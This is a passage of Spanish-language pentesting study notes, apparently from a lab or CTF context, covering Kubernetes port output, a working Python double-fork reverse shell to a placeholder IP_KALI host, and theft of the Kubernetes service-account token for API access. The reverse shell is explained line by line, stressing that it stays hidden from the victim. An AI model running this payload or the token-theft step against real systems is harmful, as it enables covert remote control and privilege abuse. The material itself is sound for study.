tcp              LISTEN            0                 4096                             127.0.0.1:41765                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*                                  
tcp              LISTEN            0                 4096                            127.0.0.54:53                               0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:6444                             0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:10256                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:10257                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:10258                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:10259                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:10248                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:10249                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                                     *:9100                                   *:*                                  
tcp              LISTEN            0                 4096                                     *:6443                                   *:*                                  
tcp              LISTEN            0                 4096                                  [::]:22                                  [::]:*                                  
tcp              LISTEN            0                 4096                                     *:10250                                  *:* 
```

Esto ocurre por dos motivos técnicos principales cuando auditamos infraestructura modernas:

1. ***Enrutamiento a nivel de Kernel (Contenedores):*** El servicio no se está ejecutando de forma nativa en el sistema operativo que estamos inspeccionando. Probablemente está aislado dentro de una red de contenedores (como *Docker* o *Kubernetes*). En lugar de abrir un puerto tradicional, el sistema utiliza reglas de cortafuegos invisibles (`iptables` o `IPVS`) que interceptan el tráfico hacia esa IP y puerto y lo redirigen al contenedor. Como `ss` o `netstat` solo leen los *sockets* abiertos por aplicaciones locales, son completamente ciegos a estas redirecciones del núcleo de Linux.
2. ***Falta de privilegios de administrador:*** Estamos ejecutando `ss -tulnp` como un usuario de bajos privilegios. el sistema operativo oculta los *sockets* y procesos (`-p`) que pertenecen a `root` o a otros usuarios. Si el motor de contenedores levanta ese servicio bajo un usuario privilegiado, no podremos verlo sin usar `sudo`.

Esta es la razón por la que nunca debemos confiar exclusivamente en las salidas de `ss` en entornos modernos. Si un archivo de configuración, variable de entorno o historial de comandos delata la existencia de un servicio, debemos intentar interactuar con él directamente (por ejemplo lanzando un `curl http://<ip>:<puerto>`) para comprobar si el enrutamiento mágico responde.

## Reverse Shell con técnica de doble fork

```python
import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(1)\ns=socket.socket()\ns.connect((\"IP_KALI\",5555))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")
```

Este código es un *payload* de ***Reverse Shell*** escrito en Python que utiliza la técnica de ***doble fork*** para "*daemonizar*", es decir, descincularse de la terminal actual y ejecutarse como un proceso fantasma en segundo plano.

#### 1. Módulos requeridos

```python
import socket,os,pty
```

- `socket`: Es la librería de red. Nos permite crear la conexión para que la máquina víctima "llame" a nuestro equipo atacante.
- `os`: Viene de *Operating System*. Nos da el poder de darle órdenes internas al sistema, como ocultar nuestro proceso en segundo plano o alterar por dónde entran y salen los datos.
- `pty`: Sirve para generar una *pseudo-terminal*. Es lo que transforma una conexión cutre y limitada en una shell interactiva de verdad, que nos permite usar comandos como `su` o usar  las flechas del teclado sin que se rompa.

#### 2. Daemonización (1ra Parte)

```python
pid = os.fork()
if pid > 0:
	import sys;sys.exit(0)
```

1. `os.fork()`: Esta función clona el programa exacto que se está ejecutando. De repente, pasamos a tener dos procesos idénticos corriendo a la vez: el proceso original (*Padre*) y el clon (*Hijo*).
2. `pid`: Al hacer el clon, el sistema operativo le asihna un número identificador (*Process ID*). La magia de `fork()` es que el Padre le devuelve un número mayor que cero (`pid > 0`), pero al hijo le devuelve un cero.
3. `if pid > 0:`: Gracias a esta condición, el código que viene justo después solo lo va a ejecutar el ***Padre***.
4. `sys.exit(0)`: El Padre se cierra a sí mismo. Literalmente se "*suicida*".

##### Por qué hacemos esto?

Cuando ejecutamos un comando en una consola, esta se queda bloqueada hasta que el comando termina. Al matar el proceso Padre casi instantáneamente, la terminal de la víctima vuelve a la normalidad de inmediato, devolviendo el control. La víctima pensaría que el comando simplemente terminó o no hizo nada.

Sin embargo, le proceso Hijo (el clon) sigue vivo, ejecutando el resto del código de forma invisible en segundo plano.

#### 3. Daemonización (2da Parte)

```python
os.setsid()
pid=os.fork()
if pid > 0:
	import sys; sys.exit(1)
```

1. `os.setsid()`: Viene de *Set Session ID*. El proceso Hijo (que sigue vivo en segundo plano tras el paso anterior) crea una sesión de sistema operativo completamente nueva e independiente. Al hacer esto, corta definitivamente el cordón invisible que aún lo unía a la terminal de la víctima.
2. ***El segundo `fork()`:*** Volvemos a clonar el proceso! Ahora el Hijo crea una copia de sí mismo (un "*Nieto*").
3. ***La segunda muerte:*** Igual que antes, evaluamos si estamos en el proceso padre de esta nueva clonación (`if pid > 0:`) y lo cerramos.

##### Por qué un segundo clon?

En los sistemas basados en *Linux/Unix* hay una regla técnica: si un proceso es el "líder" de una sesión (como lo era nuestro primer *Hijo* tras ejecutar `setsid()`), el sistema todavía le permite volver a pegarse a una terminal si se dan ciertas condiciones.

Al crear al *Nieto* y matar al *Hijo*, el *Nieto* sigue vivo, tiene su propia sesión, pero *ya no es el líder de la misma*. Esto es la garantía absoluta de que nuestro *payload* jamás volverá a asomarse por ninguna consola de forma accidental, convirtiéndose en un verdadero proceso "*fantasma*" (un demonio o "*daemon*").

#### 4. Creación de la conexión

Una vez tenemos nuestro programa corriendo como un fantasma, completamente invisible a la máquina víctima. Ahora vamos a la fase donde se comunica con nuestra máquina víctima:

```python
s = socket.socket()
s.connect(("IP_KALI", 5555))
```

1. `s = socket.socket()`: Creamos un "***socket***". Un ***socket*** es básicamente el punto de entrada y salida para una conexión de red. Lo guardamos en la variable `s`.
2. `s.connect(("IP_KALI", 5555))`: Ahora realizamos la conexión. Le estamos diciendo que se conecte a una dirección IP (`IP_KALI`) y aun puerto específico (`5555`).

 >[!important]
 >***Concepto clave: Reverse Shell***
 >
 >Es importante recordar que este código se ejecutará en la víctima, por lo que será la víctima la que se conectará a nosotros.
 >
 >***Explicación:***
 >Si nosotros, como atacantes, intentáramos conectarnos directamente a la máquina víctima, probablemente su firewall nos bloquearía la entrada. Sin embargo, al usar este código, es ***la víctima la que se conecta a nosotros***. A esto se le llama "*Conexión inversa*". Como los firewalls suelen estar configurados para permitir que el tráfico *salga* hacia Internet, esta conexión pasa desapercibida sin ser bloqueada.
 
#### 5. El Puente de Datos

```python
[os.dup2(s.fileno(),i) for i in (0,1,2)]
```

1. ***Los números `0, 1, 2`***: En sistemas *Linux/Unix*, la entrada y salida de datos se maneja a través de tres canales estándar llamados "***Descriptores de Archivos (File Descriptors)***".
   - `0 (STDIN)`: Entrada estándar (lo que escribimos en el teclado).
   - `1 (STDOUT)`: Salida estándar (lo que vemos en la pantalla cuando un comando funciona).
   - `2 (STDERR)`: Salida de errores (los mensajes de error si algo falla).
1. `s.fileno()`: Esto obtiene el "número de identificador" del socket de red que creamos en el paso anterior. Básicamente, representa la conexión con el atacante.
2. `os.dup2(A, B)`: Esta es la función clave. Lo que hace es copiar el origen 'A' en el destino 'B'.
3. ***El bucle `for i in (0,1,2)`***: el código repite la orden `os.dup2` tres veces, una para el canal 0, otra para el 1 y otra para el 2.

##### Cuál es el resultado final?

Estamos *engañando* al sistema operativo de la víctima. Le estamos diciendo: "*A partir de ahora, tu teclado (0), tu pantalla (1) y tus mensajes de error (2) ya no son la terminal física... Ahora están enchufados directamente al cable de red (el socket)".

De esta forma, cuando escribimos algo en nuestra máquina atacante, viajará por la red y entrará a la máquina víctima como si alguien lo estuviera tecleando allí (*STDIN*). Y cuando la máquina víctima ejecute el comando, el texto de respuesta no saldrá en su monitor, sino que viajará por la red hasta nuestra pantalla (STDOUT/STDERR).

#### 6. Control total del sistema

```python
pty.spawn("/bin/bash")
```

1. `/bin/bash`: Es el programa de la shell (*la línea de comandos*) de los sistemas *Linux/Unix*. Es el equivalente a abrir el `cmd.exe` o `PowerShell` en Windows. Al invocarlo, estamos abriendo el motor va a ejecutar nuestras ordenes.
2. `pty.spawn(...)`: Aquí es donde brilla la librería `pty` que importamos al principio. En lugar de lanzar la shell de una forma básica, la arranca (*spawn*) dentro de un ***Psudo-Terminal (PTY)***.

##### Por qué es vital usar `pty.spawn`?

Si arrancáramos la shell de forma normal (usando métodos más básicos de Python), obtendríamos lo que se conoce como una "*dumb shell (shell tonta)*". En una *dumb shell*, si ejecutamos un comando que requiere que el usuario interactúe (por ejemplo, escribir `su` o `sudo` para meter una contraseñas\, o usar las flechas del teclado), la conexión se cuelga o se rompe porque no sabe cómo manejar ese formato interactivo.

Al usar `pty.spawn`, le hacemos creer al sistema operativo de la víctima que hay un monitor y un teclado físicos reales conectados a esa shell. Como en el paso anterior enchufamos esa "pantalla y teclado" directamente a nuestro cable de red, el resultado es impecable: ***obtenemos una consola remota totalmente interactiva y estable***.

>Y con esto concluye el código. El proceso se oculta en segundo plano, te llama a tu dirección IP, secuestra los canales de datos y te abre una terminal interactiva lista para recibir tus comandos.

## Service Account

```
/var/run/secrets/kubernetes.io/serviceaccount/
```

>Es la ubicación estándar donde ***Kubernetes*** inyecta automáticamente la "tarjeta de identificación" de un contenedor (el ***Service Account***).

Cuando un ***Pod*** se crea, ***Kubernetes*** asume que la aplicación que corre dentro podría necesitar comunicarse con el "*cerebro*" del clúster (el servidor de la API de Kubernetes). Para que el contenedor pueda autenticarse sin que un administrador tenga que configurar contraseñas manualmente, el sistema monta este directorio en memoria e inyecta tres archivos clave:

- `token`: Token JWT real. ***Actúa como la tarjeta de acceso del contenedor***.
- `ca.crt`: Certificado de seguridad del clúster. Sirve para que el contenedor pueda cifrar su comunicación y verificar que está hablando con la API legítima de ***Kubernetes*** y no con un impostor.
- `namespace`: Archivo de texto con una sola palabra que indica en qué "*barrio*" o segmento lógico del clúster se encuentra el contendor (por ejemplo, `default`, `kube-system` o `monitoring`).

### Impacto en el pentesting

En la seguridad de contenedores, este directorio es el equivalente a encontrar una tarjeta de acceso olvidada encima de un escritorio. Si logramos ejecutar comandos dentro del contenedor (el paso donde usamos el exploit web para conseguir la _reverse shell_), el primer reflejo es ir a esta ruta.

Al robar ese `token` y enviarlo en las cabeceras de nuestras peticiones HTTP (`Authorization: Bearer $TOKEN`), la API de Kubernetes dejará de vernos como un atacante externo. Nos reconocerá como una entidad legítima interna y nos otorgará los permisos exactos que los administradores le hayan asignado a ese contenedor.
